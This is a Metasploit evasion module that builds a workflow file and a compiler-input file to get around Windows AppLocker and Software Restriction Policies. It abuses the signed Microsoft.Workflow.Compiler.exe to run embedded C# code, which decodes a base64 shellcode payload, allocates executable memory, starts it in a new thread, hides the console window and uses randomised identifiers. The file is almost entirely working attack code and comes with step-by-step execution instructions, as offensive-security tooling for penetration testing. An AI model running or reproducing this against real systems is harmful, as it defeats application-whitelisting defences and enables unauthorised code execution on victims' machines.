##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Applocker Evasion - Microsoft Workflow Compiler',
      'Description' => %(
         This module will assist you in evading Microsoft
         Windows Applocker and Software Restriction Policies.
         This technique utilises the Microsoft signed binaries
         Microsoft.Workflow.Compiler.exe to execute user supplied code.
                        ),
      'Author'      =>
        [
          'Nick Tyrer <@NickTyrer>', # module development
          'Matt Graeber' # workflow_compiler bypass research
        ],
      'License'     => 'MSF_LICENSE',
      'Platform'    => 'win',
      'Arch'        => [ARCH_X86, ARCH_X64],
      'Targets'     => [['Microsoft Windows', {}]],
      'References'  => [['URL', 'https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb']])
    )

    register_options(
      [
        OptString.new('XOML_FILE', [true, 'Filename for the .xoml file (default: workflow.xoml)', 'workflow.xoml']),
        OptString.new('XML_FILE', [true, 'Filename for the .xml file (default: workflow.xml)', 'workflow.xml'])
      ]
    )

    deregister_options('FILENAME')
  end

  def build_payload
    Rex::Text.encode_base64(payload.encoded)
  end

  def obfu
    Rex::Text.rand_text_alpha 8
  end

  def workflow_xoml
    esc = build_payload
    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]
    <<~HEREDOC
      <SequentialWorkflowActivity x:Class="#{mod[0]}" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
      <x:Code><![CDATA[
      public class #{mod[1]} : SequentialWorkflowActivity
      {
      public #{mod[1]}()
      {
      #{mod[2]}();
      }
      public static void #{mod[2]}()
      {
      IntPtr #{mod[3]};
      #{mod[3]} = GetConsoleWindow();
      ShowWindow(#{mod[3]}, #{mod[4]});
      string #{mod[5]} = "#{esc}";
      byte[] #{mod[6]} = Convert.FromBase64String(#{mod[5]});
      byte[] #{mod[7]} = #{mod[6]};
      IntPtr #{mod[8]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[7]}.Length, #{mod[12]}, #{mod[9]});
      System.Runtime.InteropServices.Marshal.Copy(#{mod[7]}, 0, #{mod[8]}, #{mod[7]}.Length);
      IntPtr #{mod[10]} = IntPtr.Zero;
      WaitForSingleObject(CreateThread(#{mod[10]}, UIntPtr.Zero, #{mod[8]}, #{mod[10]}, 0, ref #{mod[10]}), #{mod[11]});
      }
      private static Int32 #{mod[12]}=0x1000;
      private static IntPtr #{mod[9]}=(IntPtr)0x40;
      private static UInt32 #{mod[11]} = 0xFFFFFFFF;
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr #{mod[10]});
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
      [System.Runtime.InteropServices.DllImport("user32.dll")]
      static extern bool ShowWindow(IntPtr #{mod[3]}, int nCmdShow);
      [System.Runtime.InteropServices.DllImport("Kernel32")]
      private static extern IntPtr GetConsoleWindow();
      const int #{mod[4]} = 0;
      }
      ]]></x:Code>
      </SequentialWorkflowActivity>
    HEREDOC
  end

  def workflow_xml
    <<~HEREDOC
      <?xml version="1.0" encoding="utf-8"?>
      <CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
      <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
      <d2p1:string>#{datastore['XOML_FILE']}</d2p1:string>
      </files>
      <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
      <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
      <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
      <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
      <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
      <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>
      <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
      <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
      <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
      <d2p1:checkTypes>false</d2p1:checkTypes>
      <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
      <d2p1:compilerOptions i:nil="true" />
      <d2p1:generateCCU>false</d2p1:generateCCU>
      <d2p1:languageToUse>CSharp</d2p1:languageToUse>
      <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
      <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
      <d2p1:mtInfo i:nil="true" />
      <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
      </parameters>
      </CompilerInput>
    HEREDOC
  end

  def file_format_filename(name = '')
    name.empty? ? @fname : @fname = name
  end

  def create_files
    f1 = datastore['XOML_FILE'].empty? ? 'workflow.xoml' : datastore['XOML_FILE']
    f1 << '.xoml' unless f1.downcase.end_with?('.xoml')
    f2 = datastore['XML_FILE'].empty? ? 'workflow.xml' : datastore['XML_FILE']
    f2 << '.xml' unless f2.downcase.end_with?('.xml')
    xoml_file = workflow_xoml
    xml_file = workflow_xml
    file_format_filename(f1)
    file_create(xoml_file)
    file_format_filename(f2)
    file_create(xml_file)
  end

  def instructions
    print_status "Copy #{datastore['XOML_FILE']} and #{datastore['XML_FILE']} to the target"
    if payload.arch.first == ARCH_X86
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\Microsoft.Workflow.Compiler.exe #{datastore['XML_FILE']} #{Rex::Text.rand_text_alpha 3}"
    else
      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\Microsoft.Workflow.Compiler.exe #{datastore['XML_FILE']} #{Rex::Text.rand_text_alpha 3}"
    end
  end

  def run
    create_files
    instructions
  end
end
